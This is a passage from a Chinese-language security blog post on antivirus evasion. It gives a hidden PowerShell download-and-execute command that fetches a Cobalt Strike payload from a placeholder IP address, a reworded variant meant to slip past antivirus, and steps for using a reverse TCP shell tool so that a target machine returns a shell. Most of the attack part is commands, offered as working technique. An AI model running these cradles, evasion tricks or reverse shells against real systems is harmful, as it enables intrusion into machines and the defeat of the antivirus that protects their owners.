<p><strong>4、掩日</strong><br>项目地址：<a href="https://github.com/dayuxiyou/AV_Evasion_Tool/releases/tag/3.0" target="_blank" rel="noopener">https://github.com/dayuxiyou/AV_Evasion_Tool/releases/tag/3.0</a><br>相关使用项目中介绍的很清楚，这里不过多赘述。<br>单独放出来是此项目可结合以上exe进行组合免杀</p>
<h2 id="0x02powershell免杀"><a href="#0x02powershell免杀" class="headerlink" title="0x02powershell免杀"></a>0x02powershell免杀</h2><p><strong>1、cs powershell上线</strong><br>cs的powershell上线原理是直接把文本转为exe运行，无文件落地，更具隐蔽性</p>
<p>生成paylaod<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/7.png" alt="7"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8088&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure>
<p>直接执行会被杀掉<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/8.png" alt="8"></p>
<p>此时我们替换一下位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8088&#x2F;a&#39;)) | powershell -</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/9.png" alt="9"><br>成功上线。</p>
<p>但是过不了360</p>
<p><strong>2、powershell反弹shell</strong><br>这里借助工具，ReverseTCPShell<br>项目地址:<a href="https://github.com/ZHacker13/ReverseTCPShell" target="_blank" rel="noopener">https://github.com/ZHacker13/ReverseTCPShell</a></p>
<p>1、生成paylaod<br>在本地运行或者在vps运行都行</p>
<p>我这里是在本地运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell .\ReverseTCP.ps1</span><br></pre></td></tr></table></figure>
<p>配置好vps地址和监听端口即可生成两种形式的payload（cmd和powershell）<br>在目标机cmd下执行cmd的payload即可返回一个shell<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/10.png" alt="10"></p>
<p>linux下运行需要安装powershell<br>各系统安装方法参考:<a href="https://docs.microsoft.com/zh-cn/powershell/scripting/install/install-centos?view=powershell-7.2" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/powershell/scripting/install/install-centos?view=powershell-7.2</a><br>我这里以centos为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat  &#x2F;etc&#x2F;redhat-release #查看centos版本</span><br><span class="line">curl https:&#x2F;&#x2F;packages.microsoft.com&#x2F;config&#x2F;rhel&#x2F;7&#x2F;prod.repo | sudo tee &#x2F;etc&#x2F;yum.repos.d&#x2F;microsoft.repo  #获取资源</span><br><span class="line">sudo yum install -y powershell  #安装</span><br><span class="line">pwsh #验证是否安装成功</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/11.png" alt="11"><br>安装完成后上传文件并赋予执行权限<br>然后执行pwsh ./ReverseTCP.ps1即可</p>
<p>参考链接：<br><a href="https://mp.weixin.qq.com/s/ycL0a4XBxReAzKD2VaQ3kg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ycL0a4XBxReAzKD2VaQ3kg</a><br><a href="https://mp.weixin.qq.com/s/EPGqIf8Mo0V9NHglKnpqrQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/EPGqIf8Mo0V9NHglKnpqrQ</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01背景"><span class="toc-number">1.</span> <span class="toc-text">0x01背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02exe上线cs免杀"><span class="toc-number">2.</span> <span class="toc-text">0x02exe上线cs免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02powershell免杀"><span class="toc-number">3.</span> <span class="toc-text">0x02powershell免杀</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2022/01/01/Avoid_killing/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&text=免杀类" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&is_video=false&description=免杀类" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=免杀类&body=Check out this article: https://mzzdtot.github.io/2022/01/01/Avoid_killing/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&name=免杀类&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&t=免杀类" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2022
    作者
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
